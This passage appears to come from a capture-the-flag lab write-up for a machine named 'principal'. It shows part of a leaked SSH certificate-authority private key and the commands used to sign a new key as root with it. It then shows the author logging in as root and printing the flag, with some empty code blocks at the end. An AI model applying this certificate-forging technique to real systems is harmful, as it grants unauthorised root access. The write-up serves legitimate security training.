ag/YemQDTG3M+2iXTxzeeBE5ay1z+r3vQzTLl1NwOeZleDk9Ms5jSfXX8mit4EWReHECW7
Uj6RggwNoL8VrVufwd2AoE/Fuz6fJitUba68Kqe4AAYXRnIpnNQG2Q5T8+wTbY72QJhYhd
ltrAYozx1s0Drk9qe+ajWDJF0aA+YqKHew3q8bN6AW9tY5KhV+SC2Kc13f1c5l//LaYpHY
fjyl5P7R6+tlQstDbL2B3iRD2+ux9iWdk/v0wCwsqj6MpWk6a4UJBozR6/Oo4pmytg2SYp
WvAxJIihm0BrYr0RBBkAWExrJ+3md1AXMZ+y0F4HaxnH7gxxtuBSsSsVP1XE4xyIF+z4Vo
UiSCig630v/3sknAep9Wuy6q620qq72b49/OLG8LBgSFpKQKtIPDRHMpmetfFXOpcqcoWk
PAoRa9nebujFelXbQKfAHCRsRWaYHsj9UQyp3iP2xclTGPvBJ8binwA3a2V837fHHHI5Lk
7bANLH8Jn9S7cJioQaQgBKMiMoiRZkOSVX6Nc8Ne3kh1ZJkM4aJ0NXekuOQctOzFXs5vsi
SoVEMQvkB/SkElRnHhAAABABhy8XlRkaOwecexDTo2XvrpE9izZcOIfSjDk5XsB0Owuz5K
FDTxHwvQUN9krtc04hg7SlH6CB9VXsJ9JNFaIHt6Jj6ysRr+4LoXLWP3jq+CsYjTgB1dHj
VS+kwPIU6VLFKoBy2HckUQj6/kNfytX789TOj88nnT2JR1ZiYNstGdFqGA16Rs4lzzRQ80
jUiiwQeV/iH1Ux4d1br428f51cVRQXofcDLZ9DWINSBmgy9m/ZNBC0pTKBVKZfcnG+7NC8
wxIUDms+8EdX01ny/8febeg9Awt+CHM/+xtPjrJ9wpa4Dhj/6QvoJLgzuheBi7maou43kZ
2hLofFR2SmZA4WAAAAEBAPa0iPKWls4GGc7233ohByxObPVM5tHX84Vel8968omrcCA7Ju
L36JH5ZOjKanH+Eoevx2xDZQfGaMyxqgmVI/ti571bkqmemAp0QppjFGGSJrGLRbK/CIWk
No+2nECLLC/rQ70n8p7w0oYOiAs4q0S7oFGrYdvopZSLTUmvEwfi1XMZBbTZrEO9x4jTWo
FeVuCguHkqhpmw2FbnIlFVzqZop4ZbW/2OU9KpwuT1P8Xv/nXM0ZS3F3OFzZwH+r8HOQMO
CjJK3TeTe1FvSPmxDPFOhmX9gZ+QFQHrG/xpT1S/lJm3nbQH/32YJ4a0HVyDonzGptpmrP
YSfG2wniJgwmEAAAEBAMGeu3XKHj0Ow3L1plVXGSkKj/EXO7sfIHvq4soNYeiG5638psMa
tAM2xljr7b6UPwnmoXKyjjBWmmoCgr3g9FtvVIax1IFtrU278MkiwVe81vHVtrnHxVPcqd
jOnEICMGdBSI71mX9IhKnFrIxQTUmppVdpNREgxi0iPxRofyH64stciy1d7rTy4+JRmjD/
fS7OH8nBT9CD2hRkaPcckFBID8WpXvyCG7cgYH2NTJzCB0wWf14obrty37uj7PvtatiqZF
avZUzxb6uPQ2VQ/XgBtIB3Ik+PysDfJFKYkiJ934bG2MD78qDGFWIpFqhjlQK+6K8kXNfW
3m+NdOR8xTkAAAAQcHJpbmNpcGFsLXNzaC1jYQECAw==
-----END OPENSSH PRIVATE KEY-----
```

```bash
zs1n@ptw ~> chmod 600 ca_key

zs1n@ptw ~> ssh-keygen -t rsa -b 4096 -f my_key
Generating public/private rsa key pair.
Enter passphrase for "my_key" (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in my_key
Your public key has been saved in my_key.pub
The key fingerprint is:
SHA256:/aCH+ELbSDjeF2zbkaOsLCQg7ltElI8mfaFzc0fqhAw zsln@kali
The key's randomart image is:
+---[RSA 4096]----+
|   ..            |
|  .E .   .       |
|  ..* o o        |
|o..* B + o       |
|o.o.+.=.S o.     |
| .o + oo+o+o     |
|.  = =.*o=.o.    |
| .. o.=.*..      |
| ..  .o+.        |
+----[SHA256]-----+

zs1n@ptw ~> ssh-keygen -s ca_key -I "exploit" -n root my_key.pub
Signed user key my_key-cert.pub: id "exploit" serial 0 for root valid forever
```

```bash
zs1n@ptw ~> ssh -i my_key root@principal.htb
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

root@principal:~# cat root.txt
084367470a4665f1f62d6c314f699bb9
```

```bash

```

```bash

```

```bash

```

```bash

```